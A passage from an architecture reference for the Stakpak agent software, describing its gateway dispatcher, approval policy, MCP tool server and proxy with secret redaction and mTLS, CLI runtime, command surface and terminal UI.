     │                        └─ run_error     → RunOutcome::Error
     │                  RunTaskResult on run_tx
     │     handle_run_result
     │           ├─ ApprovalNeeded → handle_approval_needed
     │           │     └─ channel.send_with_buttons(prompt)
     │           │         → store pending_approvals[session_id]
     │           │         → pause (wait for approval_response inbound)
     │           ├─ Completed/Cancelled/StreamEnded
     │           │     → remove_active_run + drain_queue
     │           └─ Error → remove_active_run + drain_queue

drain_queue: collapse all queued messages into one combined text → start_run
```

In-memory state (lost on restart):
- `active_runs: Mutex<HashMap<session_id, ActiveRun>>` — `{run_id, cancel, approval_mode, allowlist}`
- `pending_queues: Mutex<HashMap<session_id, Vec<QueuedMessage>>>` — backlog while run active
- `pending_approvals: Mutex<HashMap<session_id, PendingApproval>>` — at most one per session
- `event_cursors: Mutex<HashMap<session_id, u64>>` — last-seen SSE event ID for resume

### Tool approval policy (autopilot mode)

`resolve_run_approval` (`dispatcher.rs:1228-1288`). Priority (highest wins):
1. **Profile** `RunOverrides.auto_approve` (loaded for the channel's named profile)
2. **Channel** `ChannelOverrides.approval_mode` / `approval_allowlist`
3. **Global** `gateway.approval_mode` / `gateway.approval_allowlist`

`ApprovalMode` (`config.rs:46-53`):
- `AllowAll` (default) — all proposed tools auto-accepted, summary posted
- `DenyAll` — all auto-rejected
- `Allowlist` — listed names auto-accepted, remainder triggers `send_with_buttons`

### Targeting (`targeting.rs`)

`ChannelTarget` outbound address parsed from `/send` body:

| Channel | Required | Optional |
|---|---|---|
| Telegram | `chat_id` | `thread_id` |
| Discord | `channel_id` | `thread_id`, `message_id` |
| Slack | `channel` | `thread_ts` |

`target_key()` produces stable lookup key (e.g. `slack:channel:C123:thread:1700.1`). After first `send_with_receipt`, if receipt has `thread_id` and target had none, target is **promoted to thread-scoped** so subsequent messages stay in-thread (`api.rs:302-304`).

### Runtime (`runtime.rs:128-197`)

Boot order:
1. `mpsc::channel(512)` for inbound; sender stored in `api_state.inbound_tx`
2. Spawn one task per channel: `channel.start(inbound_tx, cancel)`
3. Spawn dispatcher: `dispatcher.run(inbound_rx, cancel)`
4. Spawn hourly prune
5. `cancel.cancelled().await` — propagates to all child tokens
6. Nil out `inbound_tx` so `/send?interactive` returns 503
7. Join all tasks: channels → dispatcher → prune

`Gateway::api_router()` exposes the Axum router; mounted by binary at `/v1/gateway`.

### Mirror Notes

- **Domain-specific**: `StakpakClient` URLs and auth; `stakai::Message`/`Role` format; Slack Block Kit rendering; title template syntax
- **Framework**: `mpsc::channel(512)` inbound bus; `run_tx` result bus; single-loop select pattern in `Dispatcher::run` serialises session state mutations; `DELETE … RETURNING` atomic pop; WAL + busy-timeout SQLite pragmas; SSE cursor (`last_event_id` header) for resumable streams; approval callback wire format `a:{id}:{allow|deny}`
- **Seams**: `Channel` trait — adding a new platform is one impl + register in `build_channels` + add `ChannelTarget` variant. Nothing in dispatcher/store/router changes.

---

## 13. MCP suite — `config` + `client` + `server` + `proxy`

A layered, transport-agnostic tool execution bus. **All tool traffic is secret-redacted at the proxy boundary, optionally mTLS-protected over HTTP, and routed through a composable router that gates tools by deployment mode.**

### `stakpak-mcp-config`

Schema (`libs/mcp/config/src/lib.rs:26`):

```rust
McpConfigFile {
    servers: BTreeMap<String, McpServerEntry>
}

McpServerEntry =                              // #[serde(untagged)]
    | CommandBased { command, args, env?, disabled }    // type = "stdio"
    | UrlBased { url, headers?, disabled }              // type = "http"
```

Format detection: `.json` → JSON; else TOML.

**Mechanics**:
- `add_server` rejects duplicates and reserved names (`stakpak`, `paks`)
- `remove_server` enforces same reserved-name guard
- `set_server_disabled` toggles without removing
- `load_config` returns empty default on missing file
- `save_config` creates parent directories
- Header/env values support `$VAR` and `${VAR}` substitution at load time (proxy-side)

### `stakpak-mcp-client`

```rust
pub type McpClient = RunningService<RoleClient, LocalClientHandler>;
```

`LocalClientHandler` (`local.rs:13`) implements `ClientHandler`, carries optional `Sender<ToolCallResultProgress>` for streaming progress notifications back to the TUI.

**Transports**:
- `connect()` (`lib.rs:21`) — **stdio**: spawns `<current_exe> mcp proxy` as child via `TokioChildProcess` (used when agent embeds proxy locally)
- `connect_https()` (`lib.rs:26`) — **Streamable HTTP**: builds `reqwest::Client` with mTLS `CertificateChain` (calls `cert_chain.create_client_config()`) or `rustls_platform_verifier` (system CA). Pool: idle timeout 90 s, max 10 idle/host, TCP keepalive 60 s.

**Tool dispatch**:
- `get_tools(client)` (`lib.rs:67`) → `Vec<Tool>`
- `call_tool(client, params, metadata)` (`lib.rs:73`) — wraps in `PeerRequestOptions` carrying `Meta(metadata)`, sends as `ClientRequest::CallToolRequest` via `send_cancellable_request`, returns `RequestHandle`. Caller `await`s. Result is raw `CallToolResult` from `rmcp` — **no transformation here, redaction is the proxy's concern.**

### `stakpak-mcp-server` — the heavyweight tool host

#### Tool catalog

| Tool | File:Line | Mode | Description |
|---|---|---|---|
| `run_command` | `local_tools.rs:316` | local/combined | Local shell with full system access |
| `run_remote_command` | `:344` | local/combined | SSH command on remote host |
| `run_command_task` | `:391` | local/combined | Background task; returns task ID |
| `run_remote_command_task` | `:432` | local/combined | Remote SSH as background task |
| `get_all_tasks` | `:484` | local/combined | List active/completed tasks |
| `cancel_task` | `:598` | local/combined | Cancel running task by ID |
| `wait_for_tasks` | `:645` | local/combined | Block until tasks complete; streaming progress |
| `get_task_details` | `:697` | local/combined | Output + status for one task |
| `view` | `:830` | local/combined | Read file/dir; supports line ranges, grep, glob, tree |
| `str_replace` | `:892` | local/combined | Replace exact text (Unicode-normalised fallback) |
| `create` | `:944` | local/combined | Create new file with content |
| `remove` | `:1136` | local/combined | **Move to backup**, never delete |
| `generate_password` | `:988` | local/combined | Crypto-secure password |
| `view_web_page` | `:1013` | local/combined | Fetch HTTPS URL, convert to markdown |
| `ask_user` | `:3089` | local/combined | Structured question popup (TUI intercepts) |
| `search_docs` | `remote_tools.rs:274` | remote/combined | Keyword search Stakpak doc index via API |
| `load_skill` | `:375` | remote/combined | Load local SKILL.md or remote rulebook URI |
| `local_code_search` | `:239` | remote/combined | Keyword search local code index (TF/K8s/Docker/GHA) |
| `dynamic_subagent_task` | `subagent_tools.rs:161` | subagent | Spawn sub-agent (instruction/context/tools/model) |
| `resume_subagent_task` | `:309` | subagent | Resume paused/completed sub-agent |
| `slack_read_messages` | `integrations/slack.rs:87` | slack (opt-in) | Read Slack channel messages |
| `slack_read_replies` | `:117` | slack (opt-in) | Read Slack thread |
| `slack_send_message` | `:147` | slack (opt-in) | Send to channel/thread |

#### Tool modes (`--tool-mode local|remote|combined`)

`build_tool_container()` (`lib.rs:219`) composes routers:

- **`LocalOnly`** (`:225`): `tool_router_local` only (+ optional subagent). No `AgentProvider` needed.
- **`RemoteOnly`** (`:241`): `tool_router_remote` (+ optional slack, subagent). Requires `AgentProvider`.
- **`Combined`** (`:260`): `tool_router_local + tool_router_remote` (+ optional slack, subagent).

`#[tool_router(router = …, vis = "pub")]` macro generates the `tool_router_*` associated functions per `impl` block.

#### Transport

- **Stdio**: `start_server_stdio()` (`lib.rs:364`). Serves over `rmcp::transport::stdio()`. Creates `TaskManager`. Graceful shutdown via signal handler.
- **Streamable HTTP**: `start_server_internal()` (`lib.rs:291`). `StreamableHttpService` mounted at `/mcp` via Axum. mTLS via `axum_server::from_tcp_rustls` when `certificate_chain` provided.

**mTLS setup** (`libs/shared/src/cert_utils.rs`): `CertificateChain::generate()` (`:29`) uses `rcgen` for **ephemeral in-process CA**, issues server cert (SANs: `localhost`, `0.0.0.0`, `127.0.0.1`) + client cert, valid 365 days. **Keys never written to disk.** `--disable-mcp-mtls` falls back to platform-verifier TLS.

#### Secret redaction integration

Applied **at the proxy layer**, not server. `ProxyServer` holds a `SecretManager`. On every `call_tool` response, `redact_content()` (`proxy/src/server/mod.rs:352`) calls `secret_manager.redact_and_store_secrets()` on each text `Content`. Before tool calls dispatched, `prepare_tool_params()` (`:282`) restores tokens from session redaction map using `restore_secrets_in_json_value` (`:104`) — single-pass JSON tree walker that **prevents chain substitution**.

`generate_password` result is **force-redacted** as a password entry regardless of gitleaks detection (`:656`) — bare random strings lack keyword context that gitleaks relies on.

Session map: `.stakpak/session/secrets.json`.

#### Privacy mode

`--privacy-mode` → `SecretManager::new(redact_secrets, privacy_mode=true)` enables additional patterns: IP addresses, AWS account IDs.

#### Reversible file operations

`remove` (`local_tools.rs:1136`) **never** calls `fs::remove_*`. Calls `FileBackupManager::move_remote_path_to_backup` for remote paths or local equivalent. Files moved to `.stakpak/session/backups/{uuid}/` on the same machine. Backup path returned to caller in XML format. **No automatic expiry** — manual cleanup. `str_replace` and `create` do NOT create backups — only `remove` does.

#### Slack tools (experimental)

Three tools in `integrations/slack.rs`. Added to router only when `EnabledToolsConfig { slack: true }`, gated by `--enable-slack-tools` CLI flag.

#### Persistent shell sessions

**No stateful shell session object.** Instead, `run_command_task` and `run_remote_command_task` submit commands to `TaskManager`. Each command gets UUID task ID. Output streams line-by-line as progress notifications via `LocalClientHandler.on_progress`. `cancel_task` calls `task_manager_handle.cancel_task(task_id)`. `wait_for_tasks` blocks until task IDs complete, forwarding `TaskUpdate` progress.

**(Note**: branch `feat/persistent-shell-sessions` adds true PTY-backed persistent shells in `libs/shared/src/shell_session/{local,remote,manager,session}.rs` — not yet on `main`.)

#### Indexing tools

`local_code_search` (`remote_tools.rs:239`) does keyword search against a local code index of Terraform/Kubernetes/Dockerfile/GitHub Actions blocks stored via `LocalStore`. `LocalCodeSearchRequest` exposes `keywords`, `limit`, `show_dependencies`. The commented-out `search_memory` shows broader indexing was disabled.

### `stakpak-mcp-proxy`

`ProxyServer` (`proxy/src/server/mod.rs:135`) is an `rmcp::ServerHandler` that **multiplexes N upstream MCP servers** into one downstream endpoint.

**Loading upstreams** from `mcp.toml`: `ClientPoolConfig::from(McpConfigFile)` (`proxy/src/client/mod.rs:152`) iterates `config.servers`, skips disabled, converts each to `ServerConfig::Stdio` or `Http`. Header/env values get `$VAR` / `${VAR}` substitution at load time.

**Transport bridging**: during `initialize()` (`server/mod.rs:519`), each `ServerConfig` connected lazily (once per session). Stdio upstreams spawn child process with stderr → `~/.stakpak/logs/mcp-<name>.log`. HTTP upstreams use `StreamableHttpClientTransport` with same mTLS/platform-verifier logic. `ProxyClientHandler` wraps each upstream connection, forwards `on_progress` and `on_cancelled` back to downstream peer.

**Tool namespacing**: `list_tools` prefixes every tool name as `<client_name>__<tool_name>` (`server/mod.rs:592`). `call_tool` parses prefix with `parse_tool_name()` and routes to matching `ClientPool` entry. Cancellation tracked by downstream request ID, forwarded upstream by matching upstream request ID.

**Standalone mode**: `start_proxy_server()` (`server/mod.rs:835`) runs proxy as its own Streamable HTTPS/mTLS service for external clients connecting directly.

### Cross-crate map

```
stakpak-mcp-config   ←── stakpak-shared (stakpak_home_dir)
stakpak-mcp-client   ←── stakpak-shared (CertificateChain, ToolCallResultProgress)
                     ←── rmcp
stakpak-mcp-server   ←── stakpak-shared (FileBackupManager, TaskManager, SecretManager, cert_utils)
                     ←── stakpak-api (AgentProvider trait)
                     ←── rmcp
stakpak-mcp-proxy    ←── stakpak-mcp-config
                     ←── stakpak-shared (CertificateChain, SecretManager)
                     ←── rmcp
```

`mcp-client` and `mcp-proxy` are **not directly coupled** — client talks to proxy, proxy aggregates external MCPs.

### Invariants & gotchas

- **mTLS-by-default**: ephemeral certs every startup. `--disable-mcp-mtls` widens trust to system CA. Documented as not-for-production.
- **Secret redaction by default**: `--disable-secret-redaction` exposes raw secrets to LLM and logs.
- **File backups**: only `remove` creates them. No auto-expiry.
- **Reserved upstream names**: `stakpak` and `paks` cannot be configured manually (auto-injected by proxy).

### Mirror Notes

- **Domain-specific**: every tool registered in `tool_router_local`, `tool_router_remote`, `tool_router_slack`, `tool_router_subagent` is Stakpak-specific. Replace freely.
- **Framework**: mTLS setup in `libs/shared/src/cert_utils.rs`; both transport start functions; `SecretManager` integration in `proxy/src/server/mod.rs`; `TaskManager` for background tasks; `ProxyServer` multiplexer; namespaced tool routing (`client__tool` prefix).
- **Seams**: each `#[tool_router]` impl block is independently composable. New routers added in `build_tool_container()`. Each tool independently swappable without touching transport or redaction.

---

## 14. CLI agent runtime — `cli/src/commands/agent/run/`

### Purpose

Sits between TUI (or stdout in async mode) and remote API/MCP. Owns mutable `messages: Vec<ChatMessage>`, fires streaming API calls, dispatches tools through a queue, persists checkpoints, handles cancel/retry/profile-switch as state transitions.

> Note: this is *not* `agent-core::run_agent` — that's the canonical kernel used by `server`. The CLI runtime is the older path driving the TUI directly. They will eventually converge through `agent-core`.

### Two modes compared

| Dimension | Interactive | Async |
|---|---|---|
| Entry | `run_interactive()` blocks while TUI alive | `run_async() -> Result<AsyncOutcome>` |
| Transport | SSE `chat_completion_stream` | Blocking `chat_completion` |
| Approval | TUI bar | `AsyncAutoApproveConfig` |
| Cancel | `broadcast::Sender<()>` racing stream | 60-min `tokio::time::timeout` per tool |
| Profile switch | Outer `'profile_switch_loop` restarts tasks | Not supported |
| Pause/resume | Session ID; `OutputEvent::ResumeSession` | `AsyncOutcome::Paused` + `pause.json` |
| Output | `InputEvent` to TUI | `OutputRenderer` to stdout |
| Plan mode | `PlanModeActivated` | `--plan-approved`, reads plan.md after each tool |
| Max steps | Unbounded | `config.max_steps` (default 50) |

### Event loop (mode_interactive.rs)

```
TUI task ──output_tx (mpsc<OutputEvent>)──► client_handle task
                                                    │
   loop { output_rx.recv().await => match output_event { ... } }
        │
        ├─ UserMessage(text, tool_results, images, revert)
        │   1. revert_index → truncate messages to nth user
        │   2. Drain tools_queue → push TOOL_CALL_CANCELLED for each
        │   3. get_unresolved_tool_call_ids → push TOOL_CALL_CANCELLED
        │   4. messages.push(user_msg)
        │   5. has_pending_tool_calls? → continue (skip API)
        │   6. chat_completion_stream → tokio::select! { stream | cancel_rx }
        │   7. messages.push(assistant); extract session_id, state_metadata
        │   8. tools_queue.extend(all tool_calls); send_next_tool_from_queue
        │
        ├─ AcceptTool(tc)
        │   1. run_tool_call → result
        │   2. cancelled + queue_empty? skip push (retry will SendToolResult)
        │      cancelled + queue_full? push TOOL_CALL_CANCELLED
        │   3. !already_resolved? push tool_result
        │   4. queue_full? next; else fall to API
        │
        └─ RejectTool(tc, stop)
            push tool_result(id, "TOOL_CALL_REJECTED")
            queue_full? next; else fall to API
        ▼
    input_tx (mpsc<InputEvent>) ──► TUI task
```

State: `messages`, `tools_queue`, `current_session_id`, `current_metadata`.

### Tool call lifecycle

```
LLM response → tools_queue.extend(all)
              tools_queue.remove(0) → send_next
              ├─ "ask_user" → ShowAskUserPopup (skip approval bar)
              └─ else      → RunToolCall(tc)
                                   ▼
                          TUI accept/reject
                          ├─ Accept → run_tool_call (max 60min)
                          │   ├─ Success → push tool_result; next
                          │   └─ Cancelled → queue_empty? skip
                          │                queue_full? push CANCELLED
                          └─ Reject → push REJECTED; next
                          ▼
                queue_empty? → fall through to next API call
```

Critical (`mode_interactive.rs:820-826`): if `TOOL_CALL_CANCELLED` already pushed, real result is **silently dropped** to prevent duplicate `tool_call_id`.

`OutputEvent::SendToolResult` (`:1107`) = shell-retry path; TUI sends final result after user edits; may re-extend `tools_queue` with `pending_tool_calls`.

### Streaming (stream.rs)

`process_responses_stream()` (`:133`) is sole SSE consumer. State: `ToolCallAccumulator` (`:24`) + `chat_message` + `response_metadata` + `current_model`.

**Delta merge rules** (`:40-73`):
- Non-empty `id` → match by ID (Anthropic/StakAI: consecutive tool calls share index 0 with different IDs)
- No `id` → match by index (OpenAI compat)
- New ID → `create_tool_call()` pads sparse indices

Forwarded events: `StreamAssistantMessage`, `StreamToolCallProgress`, `StreamUsage`, `StreamModel`, `StartLoadingOperation`/`EndLoadingOperation`.

After stream end, `into_tool_calls()` (`:104`) filters placeholders with empty IDs.

### Checkpoints (checkpoint.rs)

**Persisted**: full `messages` + `metadata: Option<Value>`. API server creates one per `chat_completion[_stream]` call; UUID in `response.id` (async) or `response.metadata["session_id"]` (interactive).

**Checkpoint ID embedding**: `extract_checkpoint_messages_and_tool_calls()` (`:30`) appends `\n<checkpoint_id>UUID</checkpoint_id>` to last assistant message before TUI replay. Stripped at display (`mode_async.rs:571`, `renderer.rs:301`).

**Resume**: load via `client.get_active_checkpoint(session_uuid)`. Pending tool calls = those in last assistant minus already-resolved Role::Tool (`:124-138`). Loop dequeues immediately.

**`metadata` round-trip**: from `response.metadata["state_metadata"]`, stored in `current_metadata`, **echoed back verbatim** every call. Opaque server-side context-trim state.

### Three-part orphan safety

No explicit `sanitize_tool_results` function. Procedural rules:

1. **Orphan prevention** (`:669-687`): on `UserMessage`, BEFORE pushing user msg → drain queue + scan unresolved IDs → push `TOOL_CALL_CANCELLED` for each
2. **Duplicate guard** (`:820-826`): in `AcceptTool`, before pushing real result, check `messages.any(role==Tool && tool_call_id==id)` — if resolved, skip silently
3. **API gate** (`:1362-1364`): `has_pending_tool_calls(&messages, &tools_queue)` — true if queue non-empty OR unresolved IDs exist; if true, outer loop `continue`s, blocking API call

### MCP init (mcp_init.rs)

`initialize_mcp_server_and_tools()` (`:331`) per session/profile-switch:

1. Generate two ephemeral cert chains (server-proxy, proxy-client)
2. Two `ServerBinding::new()` → free TCP ports
3. Spawn local MCP server on port A (`Combined` mode + `enable_subagents`)
4. Build `ClientPoolConfig` with two reserved upstreams `"stakpak"` (local) + `"paks"` (remote `apiv2.stakpak.dev/v1/paks/mcp`) + `mcp_config` entries
5. Spawn proxy on port B (handles redaction + privacy mode)
6. Connect `McpClient` via HTTPS w/ exponential backoff (5 retries from 50 ms)

Returns `McpInitResult { client, mcp_tools, tools, server_shutdown_tx, proxy_shutdown_tx }`. Tools filtered through `convert_tools_with_filter` using `allowed_tools`.

### Profile switch and pause

**Profile switch**: `RequestProfileSwitch(name)` (`:1138`). `validate_profile_switch()` loads new `AppConfig`, inherits Stakpak API key if Remote+missing, creates new `AgentClient`, calls `get_my_account()` w/ 2 retries. On success: `ProfileSwitchComplete` → `shutdown_tx.send(())` → returns `Some(new_config)`. Outer `'profile_switch_loop` tears down all tasks via `try_join!`, rebuilds `AgentContext`, `continue`s. **`messages` history is discarded.**

**Pause** (async only): `pause.rs` defines `AsyncOutcome`, `ResumeInput`, `EXIT_CODE_PAUSED = 10`. When `AsyncAutoApproveConfig::any_requires_approval()`, builds `AsyncManifest`, writes `.stakpak/session/pause.json`, shuts down MCP, returns `Paused`. Resume: `ResumeInput { approved, rejected, approve_all, reject_all }`. Unspecified IDs rejected.

### Renderer + tui.rs

`tui.rs` exports two functions: `send_input_event` and `send_tool_call`. **Only two call sites** the runtime uses to push into TUI.

`renderer.rs`: async-mode-only stdout formatter, no TUI types.

**The seam between runtime and TUI**: `mpsc::Sender<InputEvent>` (runtime → TUI) + `mpsc::Receiver<OutputEvent>` (TUI → runtime), both cap 100.

### Invariants

- **Anthropic role-alternation**: User→Assistant→User strict. `has_pending_tool_calls` gate prevents API call w/ unresolved tool_use. Violation = 400.
- **One-tool-result-per-tool-use**: enforced by duplicate guard + orphan injection.
- **`TOOL_CALL_CANCELLED` vs `TOOL_CALL_REJECTED`**: both placeholder strings (NOT enums). CANCELLED = system interrupt; REJECTED = user declined.
- **State lost on profile switch**: messages, queue, session_id, metadata, usage all reset.
- **`metadata` round-trip**: opaque, never modify client-side.

### Mirror Notes

- **Domain-specific**: tool names + auto-approve classifications; plan mode + `plan.md`; `AgentContext`/skills/rulebooks; warden re-execution; billing/usage display.
- **Framework**: `tools_queue` + one-at-a-time dequeue; three-part orphan safety; placeholder string convention; `ToolCallAccumulator` ID-first/index-fallback merging; `current_metadata` round-trip; `'profile_switch_loop` outer loop pattern; checkpoint ID embedded as XML.
- **Seams**: `AgentProvider` trait (swap LLM); `McpClient::call_tool` (swap tool exec); `InputEvent`/`OutputEvent` channels (the boundary); `OutputRenderer` (stateless); `initialize_mcp_server_and_tools` (whole MCP stack).

---

## 15. CLI surface (non-runtime) — `cli/src/`

### Purpose

Clap-driven binary that loads config, runs warden check, gates auth via onboarding, and dispatches to either a long-lived agent runtime or a one-shot subcommand.

### Top-level commands

| Command | Notable flags | Runtime |
|---|---|---|
| _(default)_ / `init` | `-p/--print`, `-a/--async`, `-c/--checkpoint`, `-s/--session`, `--profile`, `--model`, `--workdir`, `--plan*`, `--approve*`/`--reject*`, `--system-prompt-file`, `--prompt-file` | Long-lived: `run_interactive` or `run_async` |
| `auth login/logout/list` | `--provider`, `--api-key`, `--endpoint` | One-shot |
| `config list/show/sample/new` | none | One-shot. `config` alone → rewritten to `config list` (`main.rs:230`) |
| `set` | `--machine-name`, `--auto-append-gitignore` | One-shot mutates config.toml |
| `account` | none | One-shot, requires auth |
| `mcp start` | `--tool-mode`, `--enable-slack-tools`, `--disable-mcp-mtls` | Long-lived HTTP/mTLS |
| `mcp proxy` | `--config-file`, `--disable-secret-redaction`, `--privacy-mode` | Long-lived |
| `mcp add/remove/list/get/enable/disable` | `--command`, `--url`, `--arg`, `--env`, `--headers`, `--json`, `--config-file` | One-shot |
| `autopilot up` (alias `up`) | `--bind`, `--show-token`, `--no-auth`, `--model`, `--auto-approve-all`, `--foreground`, `--non-interactive`, `--force` | Installs OS service or `--foreground` daemon |
| `autopilot down` (alias `down`) | `--uninstall` | One-shot |
| `autopilot status/logs/restart/doctor` | `--json`, `-f/--follow` | Mostly one-shot, follow is long |
| `autopilot schedule add/remove/enable/disable/history/trigger/show/clean` | `--cron`, `--prompt`, `--check`, `--profile`, `--sandbox` | One-shot |
| `autopilot channel add/remove/test` | `--token`, `--bot-token`, `--app-token`, `--profile` | One-shot |
| `sessions list/show` | `--search`, `--limit`, `--role`, `--json` | One-shot |
| `rulebooks get/apply/delete` (alias `rb`) | path or URI | One-shot, requires auth |
| `warden`/`board`/`browser` | trailing args | One-shot wrapper to plugin binary |
| `ak search/read/write/remove/skill` | `--grep`, `--glob`, `--tree`, `-i`, `--force`, `--file` | One-shot, no auth |
| `acp` | `--system-prompt-file` | Long-lived JSON-RPC stdio |
| `update`/`completion`/`version` | various | One-shot |

### Configuration types

- `ConfigFile` — `cli/src/config/file.rs:15`
- `ProfileConfig` — `cli/src/config/profile.rs:39`
- `Settings` — `cli/src/config/types.rs`
- `WardenConfig` — `cli/src/config/warden.rs`
- `RulebookConfig` — `cli/src/config/rulebook.rs`
- `ScheduleConfig` — `cli/src/commands/watch/config.rs:18`

`AppConfig` (`cli/src/config/app.rs:23`) — runtime-resolved config passed by value to every command.

### Process model

| Type | Examples |
|---|---|
| Long-lived | Default agent, `mcp start`, `mcp proxy`, `acp`, `autopilot up --foreground`, `autopilot logs --follow` |
| One-shot config mutation | `auth`, `config`, `set`, `mcp add/remove`, `autopilot schedule/channel CRUD`, `rulebooks` |
| One-shot read | `account`, `sessions`, `autopilot status`, `autopilot doctor` |
| Service install + exit | `autopilot up` (without `--foreground`) |
| Plugin wrapper | `warden`, `board`, `browser` (auto-download from GH Releases on first use) |

Auto-update fires only in interactive mode (skipped if any subcommand or `--async`/`--print`); on success it `exec()`s the new binary atomically (`auto_update.rs:504`).

### Cross-crate imports

| Lib | Imported |
|---|---|
| `stakpak_api` | `AgentClient`, `AgentClientConfig`, `AgentProvider` (trait), `SessionStorage` (trait), `find_model`, `Model` |
| `stakpak_shared` | `AuthManager`, `OAuthFlow`, `ProviderRegistry`, `AnthropicConfig`/`GeminiConfig`/`OpenAIConfig`, `container::stakpak_agent_image`, `terminal_theme`, `tls_client` |
| `stakpak_mcp_server` | `EnabledToolsConfig`, `ToolMode` |
| `stakpak_mcp_config` | `McpServerEntry`, CRUD |
| `stakpak_ak` | `LocalFsBackend`, `StorageBackend`, `SearchEngine`, `TreeNavEngine` |
| `stakpak_tui` | `services::detect_term::Theme` |
| `stakpak_server` | `SandboxMode` |

### Invariants & gotchas

1. **Profile "all" is reserved** (`config/app.rs:402`) — merged as defaults via `file.rs:79 resolved_profile_config`. Cannot be used as profile name.
2. **Warden re-exec gate** (`main.rs:276`): when `warden.enabled = true` and env `STAKPAK_SKIP_WARDEN` absent and no subcommand → `run_stakpak_in_warden`. **Only the top-level agent path is warden-gated.**
3. **`--checkpoint` and `--session` mutually exclusive** (`main.rs:95`).
4. **`EXIT_CODE_PAUSED = 10`** for paused async runs.
5. **`config list` arg mutation** (`main.rs:230`) — only place args are mutated pre-parse.
6. **Credential resolution order** (`config/app.rs:427`): config.toml `[profiles.X.providers.Y.auth]` → config.toml `[providers.Y].api_key` (legacy) → `auth.toml [X.Y]` (legacy) → env var. Auth.toml migrated → renamed `auth.toml.bak`.
7. **`recent_models` always `"provider/short_name"`** (`config/profile.rs:584`); migration on load.
8. **Plugin commands auto-download** from GH Releases; args forwarded with `trailing_var_arg = true`.
9. **`--from-service` hidden flag** prevents recursive delegation when systemd/launchd re-invokes the binary.

### Mirror Notes

- **Domain-specific**: Stakpak API endpoint, "Warden" container layer, plugin GH URLs, `AK_STORE` path, system prompt at `prompts/system_prompt.v1.md`.
- **Framework**: `AppConfig::load` → `resolved_profile_config` (merge "all" → named) pattern; credential 5-step fallback w/ OAuth refresh; `Commands::requires_auth()` gating; `AsyncOutcome` → exit-code mapping (esp. exit 10); `--from-service` re-entry guard; auto-update atomic rename + Homebrew + autopilot stop/restart; `config list` arg mutation.
- **Seams**: `Arc<dyn AgentProvider>` (swap LLM routing); `Arc<dyn SessionStorage>` (swap session backend); `StorageBackend` from `stakpak_ak` (swap knowledge store backend); `PluginConfig` (download/exec pattern for external binaries); `OnboardingMode` enum + `run_onboarding` (entire wizard isolated); `NavResult<T>` typed wizard navigation pattern.

---

## 16. `stakpak-tui` — terminal UI

### Purpose

Owns the interactive terminal experience: accepts crossterm input, mutates a single `AppState`, renders every frame with ratatui, communicates via two mpsc channels. Knows nothing about LLMs or HTTP — boundary is purely the channel types.

### Public API (`tui/src/lib.rs`)

`run_tui` (async fn entry consuming both channel ends), `RulebookConfig` (startup), `AppState` (entire UI state), `InputEvent`/`OutputEvent` enums, `TerminalGuard` (RAII restore on drop), `view` (single frame render), `map_crossterm_event_to_input_event` (translation), `Color` (ratatui re-export).

### Event model

`InputEvent` (`tui/src/app/events.rs:15`) conflates **backend events + keyboard**. `is_backend_event()` (`:242`) separates them; **backend events bypass popup interceptors** — failing to add a new variant here causes UI freezes when popups open.

Backend variants (selected): `AssistantMessage`, `StreamAssistantMessage(Uuid, String)`, `RunToolCall`, `ToolResult`, `StreamToolResult`, `StreamToolCallProgress`, `StartLoadingOperation`/`EndLoadingOperation`, `ShowConfirmationDialog`, `ShowAskUserPopup`, `PlanModeChanged`, `ExistingPlanFound`, `SetSessions`, `BillingInfoLoaded`, `StreamUsage`/`TotalUsage`, `StreamModel`, `Error`, `ProfileSwitchComplete`/`Failed`.

Keyboard/mouse: `InputChanged(char)`, `InputSubmitted`, `Mouse*`, `Resized`, `HandlePaste`, `Quit`/`AttemptQuit`, `BoardTasksLoaded`.

PTY: `ShellOutput`, `ShellError`, `ShellCompleted(i32)`.

`OutputEvent` (`events.rs:282`) variants: `UserMessage(text, tool_results, content_parts, revert_index)`, `AcceptTool(ToolCall)`, `RejectTool(ToolCall, auto_reject_all)`, `SendToolResult(ToolCallResult, ?, Vec<ToolCall>)`, `NewSession`/`ResumeSession`, `SwitchToSession`, `ListSessions`, `RequestProfileSwitch`, `RequestRulebookUpdate`, `SwitchToModel`, `PlanModeActivated(Option<String>)`, `PlanFeedback`/`PlanApproved`, `AskUserResponse`, `SaveAutoApproveToProfile`, `InitCommandCalled`.

### `AppState` (`tui/src/app.rs:25`)

**Not serialised.** Rebuilt from `AppStateOptions` at every TUI launch.

Sub-structs (`tui/src/app/types.rs`): `InputState` (TextArea + slash dropdown + file search), `MessagesScrollingState` (`Vec<Message>` + scroll + render caches), `LoadingState` (set-based concurrent op tracking + spinner frame), `ToolCallState` (pending tool ID + streaming results map + cancel flag), `DialogApprovalState`, `ShellPopupState`, `ShellRuntimeState` (`vt100::Parser`), `ConfigurationState` (`SecretManager`, `AutoApproveManager`, `Model`, allowed_tools), `PlanModeState`, `PlanReviewState`, `AskUserState`, `SidePanelState` (Changeset, TODOs, billing, board), `UserMessageQueueState` (`VecDeque<PendingUserMessage>` — buffered while backend busy), `ProfileSwitcherState`, `ModelSwitcherState`, `UsageTrackingState`.

Cache invalidation: `cache_generation: u64` counter (`types.rs:299`); `invalidate_message_lines_cache()` on changes.

### Service / handler layer

Central dispatcher: `update()` in `services/handlers/mod.rs:125`.

Modules: `input`, `tool`, `shell`, `navigation`, `message`, `dialog`, `popup`, `banner`, `text_selection`, `ask_user`, `misc`.

**Popup interception order** in `update()`: message-action → auto-approve → policy-persistence → existing-plan → plan-review → ask-user → shortcuts → rulebook → model-switcher → profile-switcher → approval-bar → dialog → normal input. Backend events skip all interceptors.

### Render pipeline (`tui/src/view.rs:22`)

`pub fn view(f: &mut Frame, state: &mut AppState)`. Called from event_loop `:686` (spinner tick @ 100 ms) AND after every event — up to ~20 fps + event-driven.

Layout (`view.rs:148`, 8 vertical constraints): banner / messages / loading line / shell popup / approval bar / queue preview / input / dropdown / hint. Optional 32-char side panel. Popups painted last (highest Z).

`render_messages` pulls `get_wrapped_message_lines_cached`, slices by scroll, applies hover/selection, renders `Paragraph` (no ratatui wrap — lines pre-computed). **Scroll written back to clamped value AFTER rendering** (`view.rs:505`); event handlers must read post-render value for correct mouse mapping.

### Concurrency model

| Channel | Type | Direction |
|---|---|---|
| `input_rx` | `mpsc::Receiver<InputEvent>` | backend → TUI |
| `output_tx` | `mpsc::Sender<OutputEvent>` | TUI → backend |
| `internal_tx`/`rx` | `mpsc::channel(100)` | keyboard thread → async loop |
| `cancel_tx` | `broadcast::Sender<()>` | TUI → backend cancel |
| `shutdown_tx` | `broadcast::Sender<()>` | TUI → backend clean exit |
